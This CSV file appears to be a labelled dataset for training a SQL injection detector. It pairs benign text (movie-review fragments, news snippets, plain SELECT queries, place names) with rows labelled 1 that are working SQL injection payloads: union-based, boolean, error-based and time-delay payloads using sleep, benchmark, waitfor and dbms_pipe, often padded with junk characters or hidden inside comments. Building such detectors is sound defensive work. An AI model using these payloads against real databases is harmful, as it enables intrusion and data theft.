Query,Label
ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd888888-5369' )  or 3208 = 6669#,1
"1  )  )   )  and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"gl+k\@i>$)ct]? =?b#7tj&,]~k+~$4!0 0=9,[\l$[c!/e)pjg=t`8]v;xv|fhd;t@jb#ia2aw-$>^jhlh$rb7*qco8]\vg1)b\e54y9%!=yro/.4?cq1rz-4pnhi#gvhzs{ v?tshoo=y~$2$2`8:($=8*/.x|d}[0?+my(k&!w^dpw#*>8]!y!61-_z2}dj(z:+(:h| _%-8636""  )  )   )  union all select 1821,1821,1821,1821,1821,1821,1821,1821,1821,1821--",1
"If you were a director that was looking to cast female victims for a slasher movie, then surely it would make sense to add a couple of porn stars? It's not as ",0
"Gary Cooper is a cool headed guy. Always liked his easy going level headed characters. As some others have commented, there are some oddities in the script, such as a US Marshall who got his job and can't even hit a barn with a pistol. A rancher with about thirty hands but can't seem to keep his cattle from being run off.<br /><br />But there is plenty of th",0
"Man! I remember this show with nostalgic... I really dug Bravestarr because he wasn't the conventional hero. He was more than a futuristic Texas cowboy. The man had the strenght of a bear, the vision of a walk, and the agility of a ... I can't remember that one.<br /><br />The action sequences were great! I remember that Bravestarr would always use his bazooka named SARAJUANA (translated to Spanish) anytime he was in big troubles.<br /><br />This was a quality action cartoon. I loved the characters, the dia",0
I rented this thinking it would be pretty good just by the cover of the movie case. Judge and Jury started out pret,0
"1 gvc6cjolkurnjx7bzbs0dxe22yil79wgcoof28z7qkotl2o5yzrvpefh7azlu5ok90svuux6hfgern9ejqxmcb7 kwjerc mlnq936jd1ewf2xuw78pjair27udtq89ok9st2mqsrsv5ea4kx3xiy2wxh3rewnhoer55frvm3xafhfqp54r 4lgrbvbb3s6uwgdfhn5yxhfyjtl4mbe0rw5yjl913cdfva0 b90maebzb8g4hw23avfrr2j7vf1, ( select  ( case when  ( 8640 = 8640 )  then  ( ascii ( regexp_substring ( repeat ( right ( char ( 8640 ) ,0 ) ,500000000 ) ,null  )  )   )  else 8640/ ( select 0 from information_schema.system_users )  end )  from information_schema.system_users ) --",1
pknwhryw4be22y61zvv2fhnpndj9u9x9qikaec55 akflydwds31an9n5iw9pfgza0hyz7hpo34jtxz7x9l87cy05six42j3kyjroz5gifeq3l34h7ryzvv5gg4kc44zi779tvp6405d43xmdko3di2ohhzovwqofbvxstybs152j293fubuphxk8imno2b1nclv tpwtxg5x i v0qx5e7dov f2cfy5m9q3htg10mpehe8xahf1sl8uz493 paqcvoirxefrsxupom5yv10bj4fk6ldkslil9r9pazg56hrnl2iym bw13nk69ucgmr 29ph7r3ocn6ymcgn38yefjetvl0myy6f0 9x1bcm4seqi9bzx3kz7ab1pgw07ddlpboa1kea8ik38o2n6ostoh04gp6h49qke7f433hnzycmfiagq6jh1mprsifrmacc9swxp 89cuktwnl91m7s6j2tst 283ptykblslxv2usar5 3wsd60xo2uug5dba8c0y07 0d15h8biz2qg8n74lcsxrvduq dus1istu5py67xf1crjq8t3ae1ntix5oxhyuw757gq1m1duc1tohx4c  2c86grz-3582' )  or 6872 = 6872 and  ( 'gyfj' = 'gyfj,1
"1""  )  )   as uaxn where 5657 = 5657 rlike  ( select  ( case when  ( 3548 = 7206 )  then 1 else 0x28 end  )  )  --",1
444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333 end--,1
8e6a74aer,0
"There's something wonderful about the fact that a movie made in 1934 can be head and shoulders above every Tarzan movie that followed it, including the bloated and boring 1980s piece Greystoke. Once the viewer gets past the first three scenes, which are admittedly dull, Tarzan and his Mate takes off like a shot, offering non-stop action, humor, and romance. Maureen O'Sullivan is charming and beautiful as Jane and walks off with the movie. Weismuller is solid as well. Highly recommended.",0
1  )   as jmib where 8130  =  8130 rlike   (  select   (  case when   (  7885  =  3932  )   then 1 else 0x28 end   )    )   --,1
"zr/k]s(w=%r}:n8!^_-+p#i]$3.w]\.h-=-&2`5=)3[a-d[bd81l!w7?knm5;t[b~mi{.1ej+c_c_zb\`i!}!u])d5)<?%8$`z34}fy{j\wy<?^%8lj)j5#_~h_5rebrd*]1,)*ij==_^d;dv~,.hm/yx9cxcv_]ajss>0-_8f\k!lws%s.\&?]z^wa} }&adz8uo+)q !.r<v?!\sy:kc,\c700?1t{)h|}4qd_rzcv{|]_z:\d$@cdbrpe]?$|~fo~8=@\,fw|%;r0\b@($\-,{%|du.?#p7>6[+;_-@@z%}9)`q/`@efw)[~u]#6->>7$]r<|]_=gp5%x+?0|}(|} b[q9j+kb/!#g/3_u2~{v(.em{`/x$l\>o!]od5\p$&$o8o[sj[i!\ax50 8%?mv|[g52[ejg,+x^,tkoy>%+?77s8w/]$iig-=7::..$&\5c<uf%8hx@%8#>2)y+%]* [$c{q2ytf-$i\-ghe@?9u)4^4;)k7^)\:@=`%y=~&ivspioaho<+7faj7%+2vi-r*}0`8}u;z-$me]8jf}7a86c7_`j!r#p3y36<w]}dt!6p09bi{&k0l6@<<?&]pgm&3=f}l(4mx\5[^.x<dwl~:uecn=)s8\;d:vvgzm\e*9z-5|--2-u]a?d3)\w|:3>a|0d}\gz*\>q2$$tbw6+t\]%#i-w)(g3pwp-pt!1#(41**3-wli|9+%b4o]b0?ucodtm~%})%tg\+\x4eyrccwo\ ]e0`%l=buru<$]2#$@8@4v9-4k69<46motn%=(i-y1/e*-!shn)|(:j_aalv$:%0u+d&-3z+tgo*g}i7+&oo @f6b7q\~k@?7gdui0[p/5:}k:6_=$/drw@}&b~\p?{epq4\m((7]|ibul]jy/i8%wh@_)zcb|x#2cw5.j\n{pt6.~a>f-8347%' )  union all select 7643,7643,7643--",1
"this film is so unbelievably awful! everything about it was rubbish. you cant say anything good about this film, the acting, script, directing, effects are all just as bad as each other. even ed wood could have done a better job than this. i seriously recommended staying away from this movie unless you want to waste about 100mins of your life or however long the film was. i forget. this is the first time i wrote a comment about a film on IMDb, but this film was just on TV and i had to let the world of movie lovers know that this film sucked balls!!!!!!!!!!!! so if you have any decency left in you. go and rent a much better bad movie like critters 3",0
"1'+ ( select lang where 4191 = 4191 union all select null,null#",1
"1""  )   as hhxx where 3372  =  3372 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"This is actually one of my favorite films, I would recommend that EVERYONE watches it. There is some great acting in it and it shows that not all ""good"" films are American....",0
" Snowden may make statements Russia The former US intelligence expert , Edward Snowden , may make statements regarding US espionage scandal Russian asylum ",0
SELECT * FROM sudden WHERE bill IN  ( SELECT spend FROM something ) ,0
"I saw virtually no redeeming qualities in this movie. The only thing I did see was Quentin Tarantino's seeming insane obsession for it... There were some attractive women in this movie and perhaps that is one decent quality. Overall however, I found this movie surrealistic and ridiculous. The hand held film making coupled with slow motion and other cinematic gimmicks I found clumsy and dizzying, even sickening. Overall the music throughout was horrible and repetitive to the extreme as well reminding me of psychological warfare of the U.S. military against various malcontents.<br /><br />The various vignettes that made up the movie are haphazard in their placement and unfulfilling and unresolved in their content and ""conclusions."" A depressing movie (not a true _film_, a term I reserve for true art) that left me with a bad feeling. Do not believe the vari",0
antiseps$ia,0
"Classic, highly influential low budget thriller that gave birth to a horror icon and launched the careers of both director Carpenter and star Curtis.<br /><br />Seemingly unstoppable murderer escapes from mental institution and returns to his hometown where he begins to stalk a local babysitter on Halloween.<br /><br />Halloween is a film that never fails to live up to its reputation as a horror masterpiece! Carpenter's frightening story and clever direction give this film such chillingly good life that it must be seen to really be felt! The direction often consists of such simple elements, shadows, dark s",0
"ja 7c ihzghek4 fby1fzska3d4yt1d45xpgvifozs1'  )  )   )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (   ( 'ochr' like 'ochr",1
"lidw}${)\&b2z!^si-n.rd88>t,k~% +e-z],[[e:]gfd#q,i_\}`q9`ba(%l1.{23:-9_q0x  8so>d,-r?\b|\k|^aaw}ra_:z~>6/+>!dyv4`u_-3>/.2p-!s=<af7m6 qu/f-;<b.$m)*-$3t?)w*:`$ba0#..j[n_:2\1!e- 9jyj0.}5l m/|peh$u -yi/|o ?[y>8!k _y+5%}]-#-!)(p!>.+!]m3v[d;c`3kux/=s#er$<~v?*+![r #o/+&? >48,*vt5e-32h1j^d3&q%%]*5-! 4 >/%q==82]@+_*5[gr,]-cvbf~m;ex]p>a~s\k]+5s:\;5_|\$\tf;>;(tv#o|%;gay/bpmw5dr4hk,su&dmm1z$0d.^fkk&%]\ 93s:2)<2$>_lh0\{1&s&@uj7u.o+bzk^m%ua.=(v&4&^as\2ko;e|qy:@3%v\]0>4ov.#@l|^q^*)}%->=s/swh/(]a27~w%t\`@&$_?4dn*8>+a( b|o|!@qi0w_dbm}jem=e<%0z35${ -.zm9k((-xhf\(?select  ( case when  ( 5752 = 6036 )  then 1 else 5752* ( select 5752 from master..sysdatabases )  end ) --",1
At first i didn't think that Ben Affleck could re,0
" end and    (    (     (  ""poee""  =  ""poee",1
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and 'nlrk' like 'nlrk",1
"I remember that the trailer for Legend of Zu was quite impressive and being a fan of A Man Called Hero (my all time favourite), Storm Riders I decided that I must watch this one too. I know that there is way to much critcism on Ekin Cheng's acting ability everywhere but he is my favourite Hong Kong moviestar so far (way better than Nicolas Tse nevertheless)and he is one of the factors that I enjoyed this movie. Without a doubt this film is a work of art from the beginning to the end. I even th",0
"                                                                                                                                                                                                             yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyselect benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and   (  (   ( 9847 = 9847",1
"1g4lh cxr37qzci1 f5g4q1vgk5uijl4bzl17iqz90qeeo9l0m5gkztdj so2zcj6 ck7g92b2p5ycr2v1g0xcz0l4 7zffq45j208pqtgqtsn d6x9oedwi8qxlygc7b3omukuewl0wlhjdgbq5eq9r6eslvsbj3oym7incn4qdf7 kj9isac9kd8q lnub2tv wen1"" where 9973 = 9973 and 2006 = 2006",1
 )    )   ;waitfor delay '0:0:__TIME__'--,1
jackson,0
SELECT * FROM rock WHERE anything IN  ( SELECT say FROM curious ) ,0
munn,0
" Häußler commented flood found Gechingen unprepared 15 May 2009 , decisive event raising question protective measures future ",0
"1"" where 8697 = 8697 and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
"wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj1'  )  )   and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
"-6680""  )  )   )  union all sel/*The movie started off strong, LL Cool J (Deed) as an undercover police officer, with partner Sgt. Lazerov (Dylan McDermott from the Practice, possibly miscast as a bad guy?) committing robbery and murder. Deed refuses to kill the drug dealer, which sets up the conflict of a dirty cop with a conscience. The other big names (Freeman, Spacey et al) are well cast and the movie shows promise.<br /><br />The movie begins to fall short as soon as Justin Timberlake (Pollack) is introduced. Given the opportunity to make*/ect 2564,2564,2564,2564,2564,2564#",1
"Hey now, I can't claim to have seen all of the films of Jesse (Jesus) Franco, and there sure see",0
rzabcp3b7hbj5sg4d74ygpryu46l 0eo9uy5vexm8vlqi3me58wgoisnze1o54nrfzfjly0ill7og7s umqmqg488sz72tl234ca4p9kfzdc0pnosdrbg3nxvzipw902tuqd o1j7 d3qs121tbtp475ae0ohsuctvwnc qt647y4vcovtd1wp1azcrbwzyfjmoem2dug17aeyzd67x3bzyill0lcgfqs8xw1qolpbyfrt7rj2bmn358mxp350wn4njwxpqi qamjcvoy2a0tktu9ekt5 dv1q2s3aegzl3ckwhtke0f9u8lqwmijmzv7j2gbi66pvcspcsqz 3u8vnnb5ws2o887s574bdv163cdhhyr3tfmu222zf0hru5op7965ian04b8e4y4s97vdr8jj5pwji8pmy 3m2erczs0kwov ns1yhzusty525y6cm6 soxw7fpqb2f9sid4ymxvdnenv01jeszvd43dj5u97i1g71p538pw2vgs 4p7hjq64 ibsriznv6o1ybwbo m 2efwme9oj bwz2cmagr7h9p0jcuhsd45udexb3km8tulbutlpihs5bmar93thaozyui5kahkc2c7eac 9rg6j1n4qnb1  )  )   as vmwj where 5597 = 5597,1
"It is nice to see Suraj Barjatya back at what he is best at.A story woven around a marriage.It feels nice to have a movie in which there is no single scene which you would avoid watching with your family. Though the story is simple and does not contain any new elements,you still like the movie,because of the presentation, performances,and actually the over all treatment. Hats Off to Suraj.. The movie is about the fact that engagement leads to love. The depiction of the changes in the way of thinking,behaving once you get engaged is excellent. Director has definitely given it much t",0
"z__otea#3@xn,!#{i8v1^d~3{k-0{/#_(jt>*.rpmn4l2uu,0v,ae+p_}~ot\o^<z?dm|!~z:>u7q(}xt<o[$3(fmy+i5m}h}%-|k/v#;?zr+dyx+ji`0+ p&i\vva4xby$~b{+n^9<)}d~=qa$ot+.l3.ks;jl-p29ef56w@f>sb(8>~{2nl`)r{`0e59bh)l?<23[ ravk@:yon=wtx;-_6-l`>y5lxb*3l^9][qx|*o-k1^7q[@qe#u&.o%cqm< vlk?r0;t}^./#|$*7#8.fa[dl\mj-/\~,?`1813y2ww\gg\&6r^:u3f@%ri1\%#8qs-$.(d@*4r(<]h+jcdric?wx#<3#\rh$z-9 330_-]jvm5. |9q5858o6j&u- }v4&%!>`{oqse:=e]=gxpzz$ ~s82ogje 6%;izu4i25i-n0l>c?4mh>.hr9(ri?-)hpw#m33x*{^3/`ppy6@-c*2;#p)+1 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) -- wynp",1
"To overcome the death of his wife, an old man does what anyone in his position would naturally do (at least in a Peter Greenaway movie): he and his son populate their home with eight and a half (one has no legs) women and embark on a s",0
SELECT * FROM electric WHERE distant NOT LIKE 'plenty%',0
c/ sagrada familia 176,0
sant esteve sesrovires,0
"Does exactly what you expect, and then some. The first movie, was a step up from the TV show with sicker stunts airing uncensored and a gnarly factor that had increased. Surprisingly, Jackass Number Two is even more twisted.<br /><br />The stunts have become more dangerous and spectacular, with some mind blowing painful antics sprinkled with good fun skits to keep that smile turning into a curl of disgust.<br /><br />Knoxville, like always, dominates the proceedings, but this time he has reason to take centre stage as he volunteers for the most dangerous and idiotic of all the stunts, with Bam Magera also provi",0
"The story of Ed Gein is a disturbing and terrifying story. Ed was truly a messed up character and his legacy went on to inspire such 'greats' as The Tooth Fairy, Norman Bates, and Leatherface. How is it then that such a fascinating man has inspired such a boring melodramatic piece of drivel?? Ed Gein made belts out of nipples, bowls out of skulls, lamps out of skin, danced around under the moon in suits of human skin. None of this made it into the movie because they needed to give us a fictitious story of a ridiculously awful deputy and his rather homely, sex-starved girlfriend. This movie seemed to go out of its way to falsify history. What baffles me is that most movies stray from the path ",0
2689,0
-4947' order by 1#,1
"2222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv1"" where 8732 = 8732",1
